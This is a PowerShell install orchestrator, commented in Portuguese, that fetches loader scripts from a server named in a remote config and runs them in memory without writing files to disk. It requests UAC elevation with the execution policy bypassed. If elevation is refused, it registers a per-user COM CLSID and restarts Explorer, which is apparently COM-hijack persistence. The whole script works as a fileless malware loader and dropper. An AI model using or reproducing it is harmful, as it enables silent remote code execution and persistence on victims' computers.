#Requires -Version 5.1
<#
.SYNOPSIS
    Orquestrador de install: tenta UAC (SYSTEM); se recusado, instala COM user (CLSID).

.DESCRIPTION
    NAO unifica os loaders. Delega para install-system / profile-cache via ScriptBlock
    (irm em memoria — sem gravar .ps1 em disco).
    Fluxo Auto:
      1) Se ja admin -> SYSTEM
      2) Senao pede UAC (RunAs) e re-baixa este script elevado
      3) Se UAC cancelado (Nao) -> profile-cache Install + RestartExplorer

.PARAMETER Config
    URL do JSON conf.cfg com { "server": "..." }.

.PARAMETER ScriptUrl
    URL deste orquestrador (para UAC re-baixar em memoria). Obrigatorio quando o
    script nao esta em LoaderBase/install-auto.ps1 (ex.: raw GitHub cn.txt).

.PARAMETER LoaderBase
    Base dos loaders (default: origin de -Config + /loaders).

.EXAMPLE
    & ([scriptblock]::Create((irm 'http://host:4000/loaders/install-auto.ps1'))) -Config 'http://host:4000/conf.cfg'

.EXAMPLE
    $u='https://raw.githubusercontent.com/org/repo/main/cn.txt'; & ([scriptblock]::Create((irm $u))) -Config 'https://server.example/conf.cfg' -ScriptUrl $u
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$Config,

    [ValidateSet('Auto', 'System', 'User')]
    [string]$Mode = 'Auto',

    [string]$Clsid,

    [string]$LoaderBase,

    [string]$ScriptUrl,

    [ValidateSet('Auto', 'x64', 'x86')]
    [string]$Architecture = 'Auto',

    [switch]$Force,

    [switch]$SkipRestartExplorer,

    # Uso interno: processo ja elevado a correr so o path SYSTEM
    [switch]$ElevatedSystem
)

$ErrorActionPreference = 'Stop'

function Test-IsAdmin {
    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Test-IsUacCancelled {
    param([System.Management.Automation.ErrorRecord]$ErrorRecord)
    if (-not $ErrorRecord) { return $false }
    $ex = $ErrorRecord.Exception
    while ($ex) {
        if ($ex -is [System.ComponentModel.Win32Exception] -and $ex.NativeErrorCode -eq 1223) {
            return $true
        }
        $msg = [string]$ex.Message
        if ($msg -match '(?i)cancel|canceled|cancelled|cancelad') {
            return $true
        }
        $ex = $ex.InnerException
    }
    $errMsg = [string]$ErrorRecord.ToString()
    return ($errMsg -match '(?i)cancel|canceled|cancelled|cancelad')
}

function Get-LoaderBaseFromConfig {
    param([string]$ConfigUrl)
    try {
        $u = [Uri]$ConfigUrl.Trim()
        return ("{0}://{1}/loaders" -f $u.Scheme, $u.Authority).TrimEnd('/')
    }
    catch {
        throw "Config invalida (esperado URL): $ConfigUrl"
    }
}

function Enable-Tls12 {
    param([string]$Url)
    if ($Url -match '^https://') {
        [Net.ServicePointManager]::SecurityProtocol =
            [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
    }
}

function Get-RemoteScriptText {
    param([Parameter(Mandatory = $true)][string]$Url)
    Enable-Tls12 $Url
    $wc = New-Object Net.WebClient
    try {
        return $wc.DownloadString($Url)
    }
    catch {
        $detail = $_.Exception.Message
        if ($_.Exception.InnerException) {
            $detail = $_.Exception.InnerException.Message
        }
        throw "Falha ao descarregar script: $Url — $detail"
    }
    finally {
        $wc.Dispose()
    }
}

function Invoke-RemoteLoader {
    param(
        [Parameter(Mandatory = $true)][string]$Url,
        [Parameter(Mandatory = $true)][hashtable]$BoundParams
    )
    $src = Get-RemoteScriptText -Url $Url
    if ([string]::IsNullOrWhiteSpace($src)) {
        throw "Script vazio: $Url"
    }
    # Versao antiga ainda tinha Ensure-SiblingLoader / DownloadFile — rejeitar cedo.
    if ($src -match 'Ensure-SiblingLoader') {
        throw "Loader antigo em $Url (Ensure-SiblingLoader). Actualize install-auto / cn.txt para a versao ScriptBlock."
    }
    $sb = [scriptblock]::Create($src)
    & $sb @BoundParams
}

function Invoke-SystemInstall {
    param(
        [string]$BaseUrl,
        [string]$ConfigUrl,
        [string]$Arch
    )
    Invoke-RemoteLoader -Url "$BaseUrl/install-system.ps1" -BoundParams @{
        Action       = 'Install'
        Config       = $ConfigUrl
        Architecture = $Arch
    }
}

function Invoke-UserInstall {
    param(
        [string]$BaseUrl,
        [string]$ConfigUrl,
        [string]$Arch,
        [string]$TargetClsid,
        [bool]$DoForce,
        [bool]$RestartExplorer
    )
    $p = @{
        Action       = 'Install'
        Config       = $ConfigUrl
        Architecture = $Arch
    }
    if ($TargetClsid) { $p.Clsid = $TargetClsid }
    if ($DoForce) { $p.Force = $true }
    if ($RestartExplorer) { $p.RestartExplorer = $true }
    Invoke-RemoteLoader -Url "$BaseUrl/profile-cache.ps1" -BoundParams $p
}

function Escape-SingleQuoted {
    param([string]$Value)
    if ($null -eq $Value) { return '' }
    return ($Value -replace "'", "''")
}

function Try-ElevateSystemInstall {
    param(
        [string]$AutoUrl,
        [string]$ConfigUrl,
        [string]$Arch,
        [string]$Base,
        [string]$TargetClsid,
        [bool]$DoForce
    )
    $ps = Join-Path $env:WINDIR 'System32\WindowsPowerShell\v1.0\powershell.exe'
    $cfg = Escape-SingleQuoted $ConfigUrl
    $au = Escape-SingleQuoted $AutoUrl
    $bs = Escape-SingleQuoted $Base
    $cmd = "& ([scriptblock]::Create((irm '$au'))) -Config '$cfg' -Mode System -ElevatedSystem -Architecture $Arch -LoaderBase '$bs' -ScriptUrl '$au'"
    if ($TargetClsid) {
        $cmd += " -Clsid '$(Escape-SingleQuoted $TargetClsid)'"
    }
    if ($DoForce) { $cmd += ' -Force' }

    $p = Start-Process -FilePath $ps -ArgumentList @(
        '-NoProfile',
        '-ExecutionPolicy', 'Bypass',
        '-Command', $cmd
    ) -Verb RunAs -Wait -PassThru
    if ($null -eq $p) { throw "Start-Process RunAs devolveu null" }
    return [int]$p.ExitCode
}

# --- main ---

$base = if ($LoaderBase) { $LoaderBase.TrimEnd('/') } else { Get-LoaderBaseFromConfig -ConfigUrl $Config }
$autoUrl = if ($ScriptUrl) { $ScriptUrl.Trim() } else { "$base/install-auto.ps1" }

$restartExplorer = -not $SkipRestartExplorer.IsPresent
$doForce = [bool]$Force

if ($Mode -eq 'User') {
    Invoke-UserInstall -BaseUrl $base -ConfigUrl $Config -Arch $Architecture `
        -TargetClsid $Clsid -DoForce $doForce -RestartExplorer $restartExplorer
    return
}

if ($ElevatedSystem -or (Test-IsAdmin)) {
    Invoke-SystemInstall -BaseUrl $base -ConfigUrl $Config -Arch $Architecture
    return
}

if ($Mode -eq 'System' -or $Mode -eq 'Auto') {
    try {
        $code = Try-ElevateSystemInstall -AutoUrl $autoUrl -ConfigUrl $Config -Arch $Architecture `
            -Base $base -TargetClsid $Clsid -DoForce $doForce
        if ($code -eq 0) {
            Write-Host 'Instalado.'
            return
        }
        Write-Error "install SYSTEM falhou apos UAC (exit $code). Corrija e volte a tentar, ou use -Mode User."
        exit $code
    }
    catch {
        if (Test-IsUacCancelled -ErrorRecord $_) {
            if ($Mode -eq 'System') {
                Write-Error "UAC recusado e Mode=System; sem fallback."
                exit 1223
            }
            Invoke-UserInstall -BaseUrl $base -ConfigUrl $Config -Arch $Architecture `
                -TargetClsid $Clsid -DoForce $doForce -RestartExplorer $restartExplorer
            return
        }
        throw
    }
}

Write-Error "Mode nao tratado: $Mode"
exit 1
